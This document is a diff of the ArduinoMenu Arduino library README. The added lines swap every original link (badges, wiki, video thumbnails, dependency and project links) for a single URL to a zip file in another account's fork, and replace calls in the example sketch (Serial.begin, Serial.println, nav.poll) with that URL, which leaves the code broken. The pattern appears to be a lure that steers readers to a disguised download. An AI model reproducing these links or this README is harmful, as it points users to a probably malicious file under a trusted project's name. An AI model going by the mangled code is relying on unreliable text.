@@ -2,10 +2,10 @@
 
 **Generic menu/interactivity system for the arduino framework**
 
-[![License: LGPL-2.1+](https://img.shields.io/badge/License%20LGPL-2.1+-lightgrey.svg)](https://spdx.org/licenses/LGPL-2.1-or-later.html)
-[![Build Status](https://travis-ci.org/neu-rah/ArduinoMenu.svg?branch=master)](https://travis-ci.org/neu-rah/ArduinoMenu)
-[![Donate](https://img.shields.io/badge/Donate-PayPal-green.svg)](https://www.paypal.me/ruihfazevedo)
-[![Join Gitter](https://img.shields.io/badge/GITTER-join%20chat-green.svg)](https://gitter.im/ArduinoMenu/Lobby)
+[![License: LGPL-2.1+](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip%20LGPL-2.1+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)
+[![Build Status](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)
+[![Donate](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)
+[![Join Gitter](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip%https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)
 
 ## Purpose
 Full automated or user code driven navigation system.
@@ -14,7 +14,7 @@ The user function can be operated as a single action called on click/enter or as
 The system is designed as a non blocking polling system, allowing concurrent task to run.
 Optionally the system can be operated in semi-automated mode, issuing navigation command from user code.
 
-See the [wiki](https://github.com/neu-rah/ArduinoMenu/wiki)
+See the [wiki](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)
 
 ## Simple Example
 ```c++
@@ -49,17 +49,17 @@ NAVROOT(nav,mainMenu,MAX_DEPTH,in,out);
 
 void setup() {
   pinMode(LEDPIN, OUTPUT);
-  Serial.begin(115200);
+  https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip(115200);
   while(!Serial);
-  Serial.println("Menu 4.x");
-  Serial.println("Use keys + - * /");
-  Serial.println("to control the menu navigation");
+  https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip("Menu 4.x");
+  https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip("Use keys + - * /");
+  https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip("to control the menu navigation");
 }
 
 bool blink(int timeOn,int timeOff) {return millis()%(unsigned long)(timeOn+timeOff)<(unsigned long)timeOn;}
 
 void loop() {
-  nav.poll();
+  https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip();
   digitalWrite(LEDPIN, blink(timeOn,timeOff));
 }
 ```
@@ -89,7 +89,7 @@ void loop() {
 - Tested on Arduino AVR's & ARM, Teensy, ESP8266, Esp32, nRF52, STM32
 
 ## Videos
-[![IMAGE ALT TEXT](https://img.youtube.com/vi/wHv5sU-HXVI/2.jpg)](https://youtu.be/wHv5sU-HXVI "Arduino menu 2.0 fields video") [![IMAGE ALT TEXT](https://img.youtube.com/vi/W-TRCziF67g/2.jpg)](https://youtu.be/W-TRCziF67g "Arduino menu basic features video") [![IMAGE ALT TEXT](https://img.youtube.com/vi/27KEUTpCHfg/2.jpg)](https://youtu.be/27KEUTpCHfg "Arduino menu 4.x") [![IMAGE ALT TEXT](https://img.youtube.com/vi/ebOWG0ALUWI/2.jpg)](https://youtu.be/ebOWG0ALUWI)
+[![IMAGE ALT TEXT](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip "Arduino menu 2.0 fields video") [![IMAGE ALT TEXT](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip "Arduino menu basic features video") [![IMAGE ALT TEXT](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip "Arduino menu 4.x") [![IMAGE ALT TEXT](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip)
 
 ## Plugins
 
@@ -100,7 +100,7 @@ Some plugins might be platform specific or require some hardware.
 - barField - displays a bar for numeric field on LCD
 - cancelField - allows to restore previous numeric value on escape.
 - SDMenu - full automated SD Card file picker, using standard Arduino SD lib.
-- SdFatMenu - full automated SD Card file picker, using standard SdFat (https://github.com/greiman/SdFat).
+- SdFatMenu - full automated SD Card file picker, using standard SdFat (https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip).
 
 ## Applications
 
@@ -108,67 +108,67 @@ Some applications/tutorials using ArduinoMenu, (current and older versions).
 Do you have another? please let me know on gitter or email me.
 
 **Arduino script for temperature sensor and timer.** It allows to turn on heater and light accordingly to schedule  
-https://github.com/vikulin/LCD_LAT
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **Project-GlassKilnController** electrically-heated kiln for making "Warm Glass"  
-https://arduinoinfo.mywikis.net/wiki/Project-GlassKilnController
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **ArduinoMenu demo TTGO T-Display** awesome tutorial.  
-https://sites.google.com/site/jmaathuis/arduino/lilygo-ttgo-t-display-esp32/arduinomenu-demo-ttgo-t-display
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **mvc-interface** ArduinoMenu tutorial  
-https://zaragozamakerspace.com/index.php/courses/mvc-interface/
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **Arduino Automatic Copper Tape Cutter**  
-https://www.thingiverse.com/thing:3557719
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **Reloading powder hopper level gauge and alarm**  
-https://github.com/nathandarnell/Reloading-Powder-Hopper-Level-Gauge-and-Alarm
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **ServoBox** Servo tester & monitor  
-https://github.com/jarkman/ServoBox
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **PANOBOT** A Panorama robot  
-https://github.com/RobertFach/panobot
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **teensy-midi-looper** Microcontroller-based midi performance sequencer  
-https://github.com/newdigate/teensy-midi-looper
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **AmplifierControl** Automate procedure to switch on/off amplifier and band decode of Kenwood  
-https://github.com/petrlab/AmplifierControl
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **spna** An Arduino Single Port Network Analyzer (SPNA)  
-https://github.com/tczerwonka/spna
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **LRDuino** In car multi gauge system - STM32, SSD1306, MAX31856, ADXL345, ELM327  
-https://github.com/BennehBoy/LRDuino
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **LRDuinoTD5** In car multi gauge system - STM32, SSD1306, MAX31856, ADXL345, L9637D, TD5 ECU  
-https://github.com/BennehBoy/LRDuinoTD5
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **thom-radio** Internet radio build  
-https://github.com/evfool/thom-radio
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **MIDI_drums** 7 chanel piezo MIDI drum box with menu on LCD  
-https://github.com/Sobollion/MIDI_drums
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **BalancingRobot**  
-https://github.com/SLBarker/BalancingRobot
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **swatili** 50l water meter with valve control, lcd, buttons, rtc and hall effect pulse reader  
-https://github.com/daniel-leonard-robinson/swatili
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **Fielduino** hardware PWM generator using menu to select frequency and dutty.  
-https://github.com/neu-rah/Fielduino
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **ArduinoMultiDesktop** MultiDesktop concept for hardware devices  
-https://github.com/dontsovcmc/ArduinoMultiDesktop
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **SmartGreenHouse**  
-https://github.com/dontsovcmc/SmartGreenHouse/tree/master/src
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
-**console.arduino** Portable serial debug console project using ILI9341  
-https://github.com/malachib/console.arduino
+**https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip** Portable serial debug console project using ILI9341  
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 ## Platforms
 Atmel AVR, Atmel SAM, Espressif 32, Espressif 8266, Intel ARC32, Microchip PIC32, Nordic nRF51, Nordic nRF52, ST STM32, Teensy, TI MSP430
@@ -177,26 +177,26 @@ Atmel AVR, Atmel SAM, Espressif 32, Espressif 8266, Intel ARC32, Microchip PIC32
 
 **Arduino IDE** - Install using the library manager (ArduinoMenu library - Rui Azevedo)
 
-**Platformio** - http://platformio.org/lib/show/1468/ArduinoMenu%20library
+**Platformio** - https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip%20library
 
 ## IO devices
 ### Output devices
 
 **Serial**
 
-https://www.arduino.cc/en/Reference/Serial
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 - Serial monitor.
 
 **Standard arduino LCD library**
 
-https://www.arduino.cc/en/Reference/LiquidCrystal
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 - hd44780
 
 **F Malpartida's LCDs**
 
-https://bitbucket.org/fmalpartida/new-liquidcrystal/wiki/Home
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 - HD44780 direct
 - HD44780 I2C
@@ -204,37 +204,37 @@ https://bitbucket.org/fmalpartida/new-liquidcrystal/wiki/Home
 
 **Matthias Hertel PCF8574 driver**
 
-https://github.com/mathertel/LiquidCrystal_PCF8574
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 - HD44780
 
 **Arduino TFT devices**
 
-https://www.arduino.cc/en/Guide/TFT
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **SSD1306Ascii**
 
-https://github.com/greiman/SSD1306Ascii
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 - OLED Screens based on SSD1306 controller
 
 **TFT_eSPI**
 
 An Arduino IDE compatible graphics and fonts library for ESP8266 and ESP32  
-https://github.com/Bodmer/TFT_eSPI
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 - ILI9341, ILI9163, ST7735, S6D02A1, ILI9481, ILI9486, ILI9488, HX8357D, ST7789, ILI9486
 - Waveshare 2 and 3 colour SPI ePaper displays
 
 **TFT_HX8357 driver**
 
-https://github.com/Bodmer/TFT_HX8357
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 - HX8357B, HX8357C, ILI9481 and ILI9486
 
 **Adafruit's GFX devices**
 
-https://github.com/adafruit/Adafruit-GFX-Library
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 - RGBmatrixPanel, 16x32 and 32x32 RGB LED matrix panels.
 - Adafruit_TFTLCD, 2.8" TFT LCD touchscreen breakout and TFT Touch Shield for Arduino.
@@ -247,7 +247,7 @@ https://github.com/adafruit/Adafruit-GFX-Library
 
 **UTFT devices**
 
-http://www.rinkydinkelectronics.com/library.php?id=51
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 - ITDB02 series - ITead Studio
 - TFT01 series - ElecFreaks
@@ -255,31 +255,31 @@ http://www.rinkydinkelectronics.com/library.php?id=51
 
 **U8glib devices**
 
-https://github.com/olikraus/U8glib_Arduino
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 SSD1306, 128x64, SSD1306, 128x32, SSD1306, 64x48, SSD1309, 128x64, SSD1322, 256x64, SSD1325, 128x64, SSD1327, 96x96, SH1106, 128x64, UC1601, 128x32, UC1608, 240x64, UC1610, 160x104, UC1611, 240x64, UC1611, 240x128, UC1701, 128x64, UC1701, 102x64, ST7565, 128x64, ST7565, 128x32, ST7920, 128x64, ST7920, 192x32, ST7920, 202x32, LD7032, 60x32, PCD8544, 84x48, TLS8204 , 84x48, PCF8812 , 96x65, KS0108 , 128x64, T6963, 128x64, T6963, 128x128, T6963, 240x64, T6963, 240x128, SBN1661, 122x32, LC7981, 160x80, LC7981, 240x64, LC7981, 240x128, LC7981, 320x64, SSD1351, HT1632, 24x16, Flipdisk, 28x14, Virtual Screen Device
 
 **U8G2 and U8x8 devices**
 
-https://github.com/olikraus/U8g2_Arduino
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 SSD1305 128X32_NONAME, SSD1305 128X32_NONAME, SSD1305 128X64_ADAFRUIT, SSD1305 128X64_ADAFRUIT, SSD1306 128X64_NONAME, SSD1306 128X64_VCOMH0, SSD1306 128X64_ALT0, SSD1306 128X64_NONAME, SSD1306 128X64_VCOMH0, SSD1306 128X64_ALT0, SH1106 128X64_NONAME, SH1106 128X64_VCOMH0, SH1106 128X64_WINSTAR, SH1106 128X64_NONAME, SH1106 128X64_VCOMH0, SH1106 128X64_WINSTAR, SH1106 72X40_WISE, SH1106 72X40_WISE, SH1106 64X32, SH1106 64X32, SH1107 64X128, SH1107 64X128, SH1107 SEEED_96X96, SH1107 SEEED_96X96, SH1107 128X128, SH1107 128X128, SH1122 256X64, SH1122 256X64, SSD1306 128X32_UNIVISION, SSD1306 128X32_UNIVISION, SSD1306 64X48_ER, SSD1306 64X48_ER, SSD1306 48X64_WINSTAR, SSD1306 48X64_WINSTAR, SSD1306 64X32_NONAME, SSD1306 64X32_1F, SSD1306 64X32_NONAME, SSD1306 64X32_1F, SSD1306 96X16_ER, SSD1306 96X16_ER, SSD1309 128X64_NONAME2, SSD1309 128X64_NONAME2, SSD1309 128X64_NONAME0, SSD1309 128X64_NONAME0, SSD1325 NHD_128X64, SSD1325 NHD_128X64, SSD1326 ER_256X32, SSD1326 ER_256X32, SSD1327 SEEED_96X96, SSD1327 SEEED_96X96, SSD1327 MIDAS_128X128, SSD1327 MIDAS_128X128, SSD1329 128X96_NONAME, LD7032 60X32, LD7032 60X32, ST7920 192X32, ST7920 192X32, ST7920 192X32, ST7920 128X64, ST7920 128X64, ST7920 128X64, LS013B7DH03 128X128, UC1701 EA_DOGS102, UC1701 MINI12864, PCD8544 84X48, PCF8812 96X65, HX1230 96X68, UC1604 JLX19264, UC1604 JLX19264, UC1608 ERC24064, UC1608 ERC24064, UC1608 ERC240120, UC1608 ERC240120, UC1608 240X128, UC1608 240X128, UC1638 160X128, UC1610 EA_DOGXL160, UC1610 EA_DOGXL160, UC1611 EA_DOGM240, UC1611 EA_DOGM240, UC1611 EA_DOGXL240, UC1611 EA_DOGXL240, UC1611 EW50850, UC1611 EW50850, ST7565 EA_DOGM128, ST7565 64128N, ST7565 ZOLEN_128X64, ST7565 LM6059, ST7565 LX12864, ST7565 ERC12864, ST7565 NHD_C12864, ST7565 JLX12864, ST7565 NHD_C12832, UC1601 128X32, UC1601 128X32, ST7565 EA_DOGM132, ST7567 PI_132X64, ST7567 JLX12864, ST7567 ENH_DG128064, ST7567 ENH_DG128064I, ST7588 JLX12864, ST7588 JLX12864, ST75256 JLX256128, ST75256 JLX256128, ST75256 JLX256160, ST75256 JLX256160, ST75256 JLX240160, ST75256 JLX240160, ST75256 JLX25664, ST75256 JLX25664, ST75256 JLX172104, ST75256 JLX172104, NT7534 TG12864R, IST3020 ERC19264, SBN1661 122X32, SED1520 122X32, KS0108 128X64, KS0108 ERM19264, LC7981 160X80, LC7981 160X160, LC7981 240X128, T6963 240X128, T6963 240X64, T6963 256X64, T6963 128X64, SSD1322 NHD_256X64, SSD1322 NHD_128X64, SSD1606 172X72, SSD1607 200X200, SSD1607 GD_200X200, IL3820 296X128, IL3820 V2_296X128, SED1330 240X128, RA8835 NHD_240X128, RA8835 320X240, MAX7219 32X8, A2PRINTER 384X240
 
 **UCGLib devices**
 
-https://github.com/olikraus/Ucglib_Arduino
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 ST7735, ILI9163, ILI9325, ILI9341, ILI9486, LD50T6160, PCF8833, SEPS225, SSD1331, SSD1351, HX8352C
 
 **Serial ANSI terminal**
 
-https://github.com/neu-rah/AnsiStream
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 - Unix terminal
 
 **Grove RGB LCD I2C 2x16**
 
-https://wiki.seeedstudio.com/Grove-LCD_RGB_Backlight/
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 **Web browser**
 
@@ -296,12 +296,12 @@ https://wiki.seeedstudio.com/Grove-LCD_RGB_Backlight/
 **note:** esp8266 will require a streaming library even if not using web interface, along with `#include <menuIO/esp8266Out.h>`
 
 depending on your output driver it may be one of (can install both)
-- https://github.com/neu-rah/streamFlow
-- https://github.com/scottdky/Streaming
+- https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
+- https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 ### Input devices
 
-Serial https://www.arduino.cc/en/Reference/Serial
+Serial https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 quadEncoder - Generic encoder using PCINT (builtin)  
 
@@ -311,14 +311,14 @@ Generic keyboard (no PCINT) - configurable for digital or analog keyboards (buil
 
 Analog Joystick
 
-ClickEncoder https://github.com/0xPIT/encoder
+ClickEncoder https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 Matrix keypad   
-http://playground.arduino.cc/Code/Keypad
-https://github.com/Nullkraft/Keypad
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 PCF8574 based i2c matrix keypad
-https://github.com/whatnick/i2ckeypad
+https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip
 
 User defined input calling menu navigation API
 
@@ -327,7 +327,7 @@ Web browser (experimental) when using ESP devices
 ## Dependencies
 This library depends on the following libraries:
 
-- streamFlow https://github.com/neu-rah/streamFlow (on debug mode)
+- streamFlow https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip (on debug mode)
 
 Depending on the type of input or output, other libraries might be needed. Essentially any library needed for your devices.
 
@@ -350,7 +350,7 @@ Depending on the type of input or output, other libraries might be needed. Essen
 
 more info at
 
-[wiki](https://github.com/neu-rah/ArduinoMenu/wiki) pages, [issues](https://github.com/neu-rah/ArduinoMenu/issues?utf8=%E2%9C%93&q=) or [r-site.net](http://www.r-site.net/?lang=en&at=//op%5B@id=%273090%27%5D)
+[wiki](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip) pages, [issues](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip%E2%9C%93&q=) or [https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip](https://raw.githubusercontent.com/lalsproject/ArduinoMenu/master/examples/adafruitGfx_tft_interrupt/Menu_Arduino_2.8.zip%5B@id=%273090%27%5D)
 
 ## Errors / Sugestions
 
